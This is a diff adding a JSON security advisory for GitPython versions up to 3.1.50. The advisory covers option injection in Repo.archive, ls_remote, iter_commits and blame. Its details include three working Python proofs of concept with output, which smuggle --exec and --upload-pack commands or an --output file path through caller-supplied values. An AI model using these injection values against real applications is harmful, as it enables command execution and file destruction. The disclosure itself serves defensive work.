@@ -1,0 +1,160 @@
+{
+  "id": "GHSA-956x-8gvw-wg5v",
+  "modified": "2026-07-21T20:15:26.299288501Z",
+  "published": "2026-07-21T20:10:06Z",
+  "summary": "GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`",
+  "details": "## Summary\n\nGitPython spawns the real `git` binary with an argument vector built from caller-supplied values. To prevent argument injection, GitPython maintains denylists of \"unsafe\" Git options (`--upload-pack`, `--receive-pack`, `--exec`, `-c`, `--config`, …) that can be abused to run arbitrary commands, and enforces them with `Git.check_unsafe_options()`.\n\nThat enforcement is only wired into the **network** commands — `clone_from`, `Remote.fetch`, `Remote.pull`, `Remote.push`. Several other public APIs that also forward caller-controlled values into the `git` argv have **no guard at all**:\n\n1. **`Repo.archive(ostream, treeish=None, prefix=None, **kwargs)`** forwards `**kwargs` verbatim into `git archive`. An attacker-influenced options mapping such as `{\"remote\": \".\", \"exec\": \"\u003ccmd\u003e\"}` becomes `git archive --remote=. --exec=\u003ccmd\u003e -- \u003ctreeish\u003e`, and `git archive --remote=\u003clocal repo\u003e` invokes `git-upload-archive` whose path is overridden by `--exec` → **arbitrary command execution under default Git configuration** (no `protocol.ext.allow` needed).\n\n2. **`repo.git.ls_remote(\u003curl\u003e, upload_pack=\"\u003ccmd\u003e\")`** (and the dynamic-command builder generally) turns the `upload_pack` kwarg into `--upload-pack=\u003ccmd\u003e` with no guard → **arbitrary command execution**.\n\n3. **`Repo.iter_commits(rev)`** and **`Repo.blame(rev, file)`** place the caller's `rev` value into the argv *before* the `--` end-of-options separator and apply no leading-dash check. A benign-looking ref value such as `--output=/path/to/file` is parsed by `git rev-list` / `git blame` as the `--output` option, which **opens and truncates an arbitrary file** before Git even validates the revision → arbitrary file clobber (integrity/availability; can destroy keys, configs, lockfiles, or be aimed at files the host later sources).\n\nThe first two are direct code execution; the third is an arbitrary file-overwrite primitive. All share one root cause: the `check_unsafe_options` / end-of-options discipline that GitPython applies to clone/fetch/pull/push was never extended to these sinks.\n\n## Details\n\nGitPython explicitly recognises these options as command-execution vectors. `git/remote.py:535`:\n\n```python\nunsafe_git_fetch_options = [\n    # Arbitrary command execution.\n    \"--upload-pack\",\n    \"--receive-pack\",\n    # Arbitrary file overwrite.\n    \"--exec\",\n]\n```\n\nand enforces them via `Git.check_unsafe_options()` (`git/cmd.py:963`):\n\n```python\ndef check_unsafe_options(cls, options, unsafe_options):\n    ...\n    if unsafe_option is not None:\n        raise UnsafeOptionError(f\"{unsafe_option} is not allowed, use `allow_unsafe_options=True` to allow it.\")\n```\n\nBut `check_unsafe_options` is invoked from **only five sites**, all network commands:\n\n```\ngit/remote.py:1071   Remote.fetch\ngit/remote.py:1125   Remote.pull\ngit/remote.py:1198   Remote.push\ngit/repo/base.py:1410 / :1412  Repo.clone_from\n```\n\nThe following sinks call `git` with caller-controlled options/positionals and are **not** guarded:\n\n### 1. `Repo.archive` — command execution (`git/repo/base.py:1623`)\n\n```python\ndef archive(self, ostream, treeish=None, prefix=None, **kwargs):\n    ...\n    self.git.archive(\"--\", treeish, *path, **kwargs)\n    return self\n```\n\n`treeish` and `path` are correctly placed after `--`, but `**kwargs` are converted by `Git.transform_kwarg` (`git/cmd.py:1487`) into `--\u003cname\u003e=\u003cvalue\u003e` flags and inserted **before** the `--` by `_call_process`, with no `check_unsafe_options`. `Repo.archive` already documents user-facing kwargs (`format`, `prefix`, `path`), so forwarding a caller options mapping is an expected usage. Final argv:\n\n```\ngit archive --remote=. --exec=\u003ccmd\u003e -- \u003ctreeish\u003e\n```\n\n`git archive --remote=\u003crepo\u003e` runs the upload-archive helper; `--exec=\u003ccmd\u003e` overrides the helper path, executing `\u003ccmd\u003e` on the host. This works with **default Git config** — it does not rely on the `ext::` transport (which is blocked by default).\n\n### 2. `repo.git.ls_remote(..., upload_pack=...)` — command execution (dynamic builder, `git/cmd.py:1487`)\n\n`transform_kwarg` dashifies `upload_pack` → `--upload-pack=\u003cvalue\u003e`. `git ls-remote \u003clocal-repo\u003e --upload-pack=\u003ccmd\u003e` executes `\u003ccmd\u003e`. The dynamic builder makes **both** the flag name and value caller-controlled (`repo.git.\u003canything\u003e(**user_dict)`), and `ls_remote` has no `check_unsafe_options`.\n\nThis is exactly the underscore-kwarg-vs-hyphen-kwarg gap that CVE-2026-42215 fixed for `fetch`/`pull`/`push`/`clone_from` — but `ls_remote` and the rest of the dynamic surface were left unpatched.\n\n### 3. `Repo.iter_commits` / `Repo.blame` — arbitrary file overwrite (`git/objects/commit.py:348`, `git/repo/base.py:1199`)\n\n```python\n# Commit.iter_items (reached via Repo.iter_commits)\nproc = repo.git.rev_list(rev, args_list, as_process=True, **kwargs)   # args_list == [\"--\", *paths]\n```\n\n```python\n# Repo.blame\ndata = self.git.blame(rev, *rev_opts, \"--\", file, p=True, stdout_as_string=False, **kwargs)\n```\n\n`rev` is placed **before** `--`, with no leading-dash check anywhere in the path. A caller passing `rev=\"--output=/path\"` (a value that looks like an ordinary ref/branch/tag string an app forwards from user input) produces:\n\n```\ngit rev-list --output=/path --\n```\n\n`git rev-list`/`log`/`blame` honour `--output=\u003cfile\u003e`, which `open()`s and truncates the file *before* validating the revision — so the file is destroyed even though Git then errors out on the bad revision.\n\n## PoC\n\nAll three PoCs are self-contained, run against the released **GitPython 3.1.50** under **default Git configuration**, and were executed live (git 2.51.0). Each prints a host-side marker proving the effect.\n\n### Install\n\n```bash\npython3 -m venv venv \u0026\u0026 . venv/bin/activate\npip install GitPython           # resolves to 3.1.50\npython -c \"import git; print(git.__version__)\"   # 3.1.50\n```\n\n### PoC 1 — command execution via `Repo.archive`\n\n```python\n# archive_rce.py\nimport io, os, tempfile, subprocess, git\n\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a',\n                'commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\n\nmarker = os.path.join(tempfile.gettempdir(), 'gp_rce_marker')\nif os.path.exists(marker): os.remove(marker)\n\n# a service lets a user export a repo and forwards their options dict\nopts = {'remote': '.', 'exec': 'touch ' + marker}\ntry:\n    repo.archive(io.BytesIO(), **opts)\nexcept git.exc.GitCommandError as e:\n    print('[*] git exited non-zero (expected), but the exec already ran:', str(e).splitlines()[0][:60])\n\nprint('[+] marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git exited non-zero (expected), but the exec already ran: Cmd('git') failed due to: exit code(128)\n[+] marker present: True\n```\n\n`git config --get protocol.ext.allow` returns nothing (unset = default), confirming no special config is required.\n\n### PoC 2 — command execution via `git.ls_remote(upload_pack=...)`\n\n```python\n# lsremote_rce.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nmarker = os.path.join(tempfile.gettempdir(),'gp_lsr_marker')\nif os.path.exists(marker): os.remove(marker)\ntry:\n    repo.git.ls_remote('.', upload_pack='touch '+marker+';')\nexcept git.exc.GitCommandError as e:\n    print('[*] git err:', str(e).splitlines()[0][:50])\nprint('[+] ls-remote marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git err: Cmd('git') failed due to: exit code(128)\n[+] ls-remote marker present: True\n```\n\n### PoC 3 — arbitrary file overwrite via a benign-looking `rev`\n\n```python\n# itercommits_filewrite.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nvictim = os.path.join(tempfile.gettempdir(),'gp_fw_victim')\nopen(victim,'w').write('do not delete\\n')\nprint('[*] before:', repr(open(victim).read()))\nuser_ref = '--output=' + victim          # value an app forwards as a \"ref/branch\"\ntry:\n    list(repo.iter_commits(user_ref))\nexcept git.exc.GitCommandError as e:\n    print('[*] git err (after open+truncate):', str(e).splitlines()[0][:50])\nprint('[+] after :', repr(open(victim).read()), '\u003c- truncated')\n```\n\nVerbatim output:\n\n```\n[*] before: 'do not delete\\n'\n[*] git err (after open+truncate): Cmd('git') failed due to: exit code(129)\n[+] after : '' \u003c- truncated\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.1.51"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.7",
+        "0.2.0-beta1",
+        "0.3.0-beta1",
+        "0.3.0-beta2",
+        "0.3.1-beta2",
+        "0.3.2",
+        "0.3.2.1",
+        "0.3.2.RC1",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.9.dev0",
+        "2.0.9.dev1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.10",
+        "2.1.11",
+        "2.1.12",
+        "2.1.13",
+        "2.1.14",
+        "2.1.15",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.1.7",
+        "2.1.8",
+        "2.1.9",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.0.6",
+        "3.0.7",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.1.1",
+        "3.1.10",
+        "3.1.11",
+        "3.1.12",
+        "3.1.13",
+        "3.1.14",
+        "3.1.15",
+        "3.1.16",
+        "3.1.17",
+        "3.1.18",
+        "3.1.19",
+        "3.1.2",
+        "3.1.20",
+        "3.1.22",
+        "3.1.23",
+        "3.1.24",
+        "3.1.25",
+        "3.1.26",
+        "3.1.27",
+        "3.1.28",
+        "3.1.29",
+        "3.1.3",
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.4",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46",
+        "3.1.47",
+        "3.1.48",
+        "3.1.49",
+        "3.1.5",
+        "3.1.50",
+        "3.1.6",
+        "3.1.7",
+        "3.1.8",
+        "3.1.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.1.50",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-956x-8gvw-wg5v/GHSA-956x-8gvw-wg5v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/pull/2163"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51"
+    }
+  ]
+}
